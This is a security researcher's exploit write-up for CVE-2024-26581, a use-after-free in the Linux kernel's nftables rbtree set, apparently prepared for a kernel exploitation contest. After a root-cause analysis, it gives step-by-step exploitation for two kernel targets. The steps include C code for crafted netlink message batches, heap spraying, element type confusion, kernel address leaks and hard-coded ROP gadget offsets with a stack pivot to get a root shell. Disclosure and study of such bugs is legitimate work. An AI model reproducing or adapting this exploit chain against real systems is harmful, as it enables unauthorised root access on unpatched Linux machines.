# Exploit detail about CVE-2024-26581
If you want to get some base information about CVE-2024-26581, please read [vulnerability.md](./vulnerability.md) first.

## Background
nftables is a netfilter project that aims to replace the existing {ip,ip6,arp,eb}tables framework, providing a new packet filtering framework for {ip,ip6}tables, a new userspace utility (nft) and A compatibility layer. It uses existing hooks, link tracking system, user space queuing component and netfilter logging subsystem.

It consists of three main components: kernel implementation, libnl netlink communication and nftables user space front-end. The kernel provides a netlink configuration interface and runtime rule set evaluation. libnl contains basic functions for communicating with the kernel. The nftables front end is for user interaction through nft.

nftables implements data packet filtering by using some components like `table`, `set`, `chain`, `rule`.

## Cause anaylysis
In function `nft_rbtree_gc_elem`, it lacks a check similar to this [commit](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/net/netfilter/nft_set_rbtree.c?id=2ee52ae94baabf7ee09cf2a8d854b990dac5d0e4) for the setelement pointed to by `prev`. 
This is the existing check for looking for prev:
```c 
    while (prev) {
        rbe_prev = rb_entry(prev, struct nft_rbtree_elem, node);
        if (nft_rbtree_interval_end(rbe_prev) &&
        nft_set_elem_active(&rbe_prev->ext, genmask))
            break;
        prev = rb_prev(prev);
    }
```
and this is how it should be checked:
```c
    u8 cur_genmask = nft_genmask_cur(net);
    while (prev) {
        rbe_prev = rb_entry(prev, struct nft_rbtree_elem, node);
        if (nft_rbtree_interval_end(rbe_prev) &&
        nft_set_elem_active( &rbe_prev->ext,  genmask) &&
        nft_set_elem_active(&rbe_prev->ext, cur_genmask))
            break;
        prev = rb_prev(prev);
    }
```
The lack of this check may result in use-after-free of the set element pointed to by prev.

The lack of this check may result in use-after-free of the set element pointed to by prev. The check here(`nft_set_elem_active(&rbe_prev->ext, cur_genmask)`) means checking whether prev setelem is added by the current batch command. Without this check, when prev setelem is added by the current batch command and other commands have errors, triggering the command rollback mechanism of nftables, `nf_tables_abort` will eventually be called to roll back the executed command. At this time, two deletion operations will be generated for prev setelem, and the paths are:
1. `nft_rbtree_gc_elem` -> `nft_trans_gc_queue_sync_done` -> `nft_trans_gc_trans_free` -> `nf_tables_set_elem_destroy`
2. `nf_tables_abort` -> `nf_tables_abort_release` -> `nft_set_elem_destroy` 


## Triggering the vulnerability

- Create a rbtree set `A` with flag `NFT_SET_TIMEOUT` and `NFT_SET_INTERVAL`
- Insert an set element in set `A` with flag `NFTA_SET_ELEM_EXPIRATION` and `NFTA_SET_ELEM_TIMEOUT`  
- Insert another set element in set `A` with flag `NFT_SET_ELEM_INTERVAL_END`(in this step we will finally call `nft_rbtree_gc_elem`)
- Send some error command to trigger function `__nf_tables_abort`

By the way, we need to send the command of step 3 and step 4 together to trigger the vulnerabiltiy.

## Exploit it

### LTS

#### Steps
Exploit CVE-2024-26581 is the same as exploit [CVE-2024-1085](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2024-1085_lts/docs/exploit.md) on LTS instances.

- 1. Create a pipapo set `A`, and a catchall set element `B` in it.
- 2. Trigger the vulnerability by following messages:
   
   ```c
    msg_list[0] = del_setelem_msg(table, pipapo_set, NULL, 0, NULL, 0, 1);//delete the catchall set element first time
    msg_list[1] = del_table_msg(test_table);//kfree another heap to avoid crash
    msg_list[2] = del_setelem_msg(table, pipapo_set, NULL, 0, NULL, 0, 1);//delete the catchall set element second time
    send_msg_list(socket, msg_list, 3);
   ```
   	After this we kfree the catchall set element `B` twice. This makes it possiable that we alloc the heap back twice.
- 3. Try to alloc the heap of the catchall set element `B` back by creating `nft_table` with `NFTA_TABLE_USERDATA`. Keep allocing heap, and each time you alloc a heap, check whether the heap has been alloced for(confirmed by whether the memory of the already created heap has been modified). After this step, We will find two `nft_table` with the same `udata`. We assume that the two `nft_tables` are `nft_table C` and `nft_table D`.
- 4. Delete `nft_table C`.
- 5. Spray heap to reclaim `nft_table C->udata`. I spray heap by creating set element with `NFTA_SET_ELEM_EXPR` because I want to leak the `ops` pointer of the `nft_expr`.
- 6. Dump `nft_table D`. Now we leak `nft_last_ops`.
- 7. Create another set element `E`. Then dump the `nft_table D` again. We can get the pointer of the set element `E` because each bitmap set element has a doubly linked list.
  ```c
  struct nft_bitmap_elem {
	struct list_head	head;
	struct nft_set_ext	ext;
	};
  ```
- 8. Delete set element `E`. Fill the heap memory of set element `E` through heap spraying.
  ```c
    //ops->dump
    *(uint64_t *)&pad[0x40] = kernel_off + 0xffffffff810b9f43;//leave ; ret
    //ops->type
    *(uint64_t *)&pad[0x78] = kernel_off + 0xFFFFFFFF83967420;//last type
    spray_tables(socket,0x200, pad, 0x80);
  ```
- 9. Delete `nft_table D`, which will cause a UAF on a set element from step 5.
- 10. Fill the heap memory of `nft_table D ->udata` with fake `nft_expr` and ROP gadget.
- 11. Dump the set elements we create in step 5. Finally we will jmp to our ROP gadget.
    ```c
	static int nf_tables_fill_expr_info(struct sk_buff *skb,
						const struct nft_expr *expr)
	{
		if (nla_put_string(skb, NFTA_EXPR_NAME, expr->ops->type->name))
			goto nla_put_failure;

		if (expr->ops->dump) {
			struct nlattr *data = nla_nest_start_noflag(skb,
									NFTA_EXPR_DATA);
			if (data == NULL)
				goto nla_put_failure;
			if (expr->ops->dump(skb, expr) < 0) //we hijack RIP here
				goto nla_put_failure;
			nla_nest_end(skb, data);
		}
	...

  ```

#### ROP detail

The assembly code when calling expr->ops->dump is as follows:

```
	mov     rax, [rbp+0]
	mov     rsi, rbp
	mov     rdi, rbx
	mov     rax, [rax+40h]
	call    __x86_indirect_thunk_rax
```
So the `rbp` is the pointer of the current `nft_expr`. We fill it by following:
```c
	...
	//build fake setelem
    *(uint64_t *)&setelem_data[0x28] = ops_addr; //expr[0]->ops
    //start ROP
    *(uint64_t *)&setelem_data[0x30] = kernel_off + 0xffffffff8112af10;//pop rdi; ret  expr[0]->data
	...
```

The first step of ROP start looks like this(We fill the ops pointer in step 8):
```
expr->ops->dump(skb, expr)  --> leave ; ret 
```
This will finally makes this happen:

```
rsp = element + 0x28 // mov rsp, rbp  
rbp = *(element + 0x28) //pop rbp  rbp=*(&setelem_data[0x28])
rsp = element + 0x30 
rip = *(element + 0x30) //ret   rip=*(&setelem_data[0x30])
rsp = element + 0x38 
```
After completing the stack migration, we can run ROPgadget and finally get the root shell.

### COS&&Mitigation
Because of this [commit](https://github.com/thejh/linux/commit/5437982404c326744b3921de112ec1654fc6d20b), I cannot use the same method which works fine on LTS slot. After analyzing the code of `net/netfilter/rbtree.c`, I found another idea: I can construct the rbtree structure and then exploit this vulnerability to reinsert a node that should have been removed into the rbtree.

The key to realizing this idea lies in the implementation of the function `rbtree_remove`:
```c
static void nft_rbtree_remove(const struct net *net,
			      const struct nft_set *set,
			      const struct nft_set_elem *elem)
{
	struct nft_rbtree *priv = nft_set_priv(set);
	struct nft_rbtree_elem *rbe = elem->priv;

	write_lock_bh(&priv->lock);
	write_seqcount_begin(&priv->count);
	rb_erase(&rbe->node, &priv->root);
	write_seqcount_end(&priv->count);
	write_unlock_bh(&priv->lock);
}

```
This function removes the corresponding element from rbtree by calling `rb_erase`. This is no problem, but what happens if CVE-2024-26581 is triggered under special circumstances?

Letâ€™s first review the steps to trigger this vulnerability on LTS slot:
```c
    //step2: trigger the vul
    //Now trigger the vul. We will kfree the heap of setelem_with_INTERVAL_END twice.
    *key1 = 0x58;
    msg_list[0] = new_setelem_with_INTERVAL_END_msg(table, rbtree_set, key1, 0x40);
    char *table_for_pad = "table for pad";

    msg_list[1] = new_table_with_udata_msg(table_for_pad, pad, 0x60);
    *key1 = 0x48;

    msg_list[2] = new_setelem_with_expiration_msg(table, rbtree_set, NULL, 0, obj_for_exp, key1, 0x40, NULL, 0, 0, 0xffff000000000000);//gc here

    msg_list[3] = new_setelem_msg(table, hash_set, NULL, 0, NULL, NULL, 0, NULL, 0);//trigger __nf_tables_abort
    send_msg_list(socket, msg_list, 4);
``` 
That's what will happen after we send the message list:

- msg[0]: Insert an element with `INTERVAL_END` into `rbtree_set`
- msg[1]: Create a table with `udata`
- msg[2]: Insert an element into `rbtree_set` with triggering `nft_rbtree_gc_elem`. Finally the element we create in msg[0] will be removed by `rb_erase` and destroy by `nft_set_gc_batch_complete`
- msg[3]: Error message and finally trigger `__nf_tables_abort`. All previous messages will be rolled back:
  - The element created in msg[2] will be removed by function `nft_rbtree_remove` and will be freed by function `nft_set_elem_destroy`
  - The table created in msg[1] will be removed and freed
  - The element created in msg[0] will be removed by function `nft_rbtree_remove` and will be freed by function `nft_set_elem_destroy` again!
  
So we can remove and free an element of rbtree twice by CVE-2024-26581. 

In the process of removing a node from an rbtree, there are the following scenarios: if the node is the left child of its parent and has a non-empty left child node while its right child node is empty, the parent's left child node is replaced with its own left child node. If the node is the right child of its parent and has a non-empty right child node while its left child node is empty, the parent's right child node is replaced with its own right child node.

Based on the above characteristics, I changed a method to exploit CVE-2024-26581:
```c
    *key1 = 0xa0;
    msg_list[0] = new_setelem_with_INTERVAL_END_msg(table, rbtree_set, key1, 0x40);
    *key1 = 0xb0;
    msg_list[1] = new_setelem_with_expiration_msg(table, rbtree_set, pad, 0x60, obj_for_exp, key1, 0x40, NULL, 0, 0, 0xffff000000000000);

    *key1 = 0x10;
    msg_list[2] = new_setelem_with_expiration_msg(table, rbtree_set, pad, 0xf0, obj_for_exp, key1, 0x40, NULL, 0, 0, 0xffff000000000000);//gc here

    msg_list[3] = new_chain_msg("test","test",0);
    send_msg_list(socket, msg_list, 4);

```

That's what will happen after we send the message list:

- msg[0]: Insert an element `A` with `INTERVAL_END` into `rbtree_set`
- msg[1]: Insert another element `B` into `rbtree`. This element will become the left child node of the element created by msg[0]
- msg[2]: Insert an element into `rbtree_set` with triggering `nft_rbtree_gc_elem`. Finally the element `A` we create in msg[0] will be removed by `rb_erase` and destroy by `nft_set_gc_batch_complete`. `rb_erase` will replace element B to the left child node of element A's parent node
- msg[3]: Error message and finally trigger __nf_tables_abort. All previous messages will be rolled back:
  - The element created in msg[2] will be removed by function `nft_rbtree_remove` and will be freed by function `nft_set_elem_destroy`
  - The element `B` created in msg[1] will be removed and freed. 
  - The element `A` created in msg[0] will be removed by function `nft_rbtree_remove` and will be freed by function `nft_set_elem_destroy` again! `rb_erase` will replace element B to the left child node of element A's parent node again! This means that we reinserted the element `B` that was about to be freed into the rbtree!

After that, we can complete the exploit through the different sizes of the setelement of different sets. Here are the complete steps:

- 1. Construct an rbtree that meets the requirements
- 2. The vulnerability is triggered by the method mentioned above, and finally a released element `B` will be inserted into rbtree.
- 3. Create an element `C` of a pipapo set to get the heap of the element `B` back. Because the `nft_set_ext` offset in `nft_rbtree_elem` and `nft_pipapo_elem` is different, we can fake the `ext` in `nft_rbtree_elem` by filling some fields of `ext` in `nft_pipapo_elem` (just like some type confusion exploits).
  ```c
  struct nft_pipapo_elem {
	struct nft_set_ext ext;
  };

  struct nft_rbtree_elem {
	struct rb_node		node;
	struct nft_set_ext	ext;
  };

  ```
  The key point is to forge NFT_SET_EXT_USERDATA and udata_size, which represents the length of udata, because we need to leak information through out-of-bounds reading of udata.
  ```c
    //step 3
    //Now we have a free setelem in rbtree_set
    //We pad some parts of the set element, which is some fake part of set element of rbtree_set
    *(uint64_t *)&key[12] = 0x3000000000006000;//NFT_SET_EXT_KEY=0x60, NFT_SET_EXT_USERDATA=0x30
    *(uint64_t *)&key[20] = 0;
    *&key[60] = 0xff;//fake udata_size
    *(uint64_t *)&pad[7] = 0x70; //fake key
    new_setelem_with_expr(socket, table, pipapo_set, pad, 0x70, obj_for_exp, key, 0x40, NULL, 0);
  ```
- 4. Create some bitmap elements to ensure that when reading udata out of bounds, you can read an element pointer(because the head of `nft_bitmap_elem` will save a doubly linked list):
  ```c
  struct nft_bitmap_elem {
	struct list_head	head;
	struct nft_set_ext	ext;
  };
  ```
- 5. Get element `B`. We will get the address of `nft_last_ops` and the address and the key of an element `D` of bitmap set.
- 6. Delete the element `D` we get in step 5.
- 7. Create some bitmap elements with our ROP gadget to get the heap of the element `D` back.
- 8. Delete the element `C`
- 9. Create an element `E` of a pipapo set to get the heap of the element `C` back(just like step 3). This time we hijack RIP by forging NFT_SET_EXT_EXPRESSIONS and nft_expr:
  ```c
    *(uint64_t *)&key[12] = 0x3000000000007800;//NFT_SET_EXT_KEY=0x78, NFT_SET_EXT_USERDATA=0x30
    *(uint64_t *)&key[20] = 0x5058;//NFT_SET_EXT_EXPRESSIONS=0x58, NFT_SET_EXT_OBJREF=0x50

    *(uint64_t *)&pad[0x17] = 0x10;//setelem->expr's size
    *(uint64_t *)&pad[0x1f] = ops_addr+0x20;//setelem->expr[0]->ops
    *(uint64_t *)&pad[0x27] = kernel_off + 0xffffffff8195e9f0;//pop rsp; ret  stack migration second
    *(uint64_t *)&pad[0x2f] = ops_addr+0x20;
    *(uint64_t *)&pad[0x37] = 0x70; //fake key
  ```
- 10. Get element `B`. We will hijack RIP, perform stack migration, and finally jump to the ROP gadget to get the root shell:
  ```c
  	static int nf_tables_fill_expr_info(struct sk_buff *skb,
						const struct nft_expr *expr)
	{
		if (nla_put_string(skb, NFTA_EXPR_NAME, expr->ops->type->name))
			goto nla_put_failure;

		if (expr->ops->dump) {
			struct nlattr *data = nla_nest_start_noflag(skb,
									NFTA_EXPR_DATA);
			if (data == NULL)
				goto nla_put_failure;
			if (expr->ops->dump(skb, expr) < 0) //we hijack RIP here
				goto nla_put_failure;
			nla_nest_end(skb, data);
		}
  ```

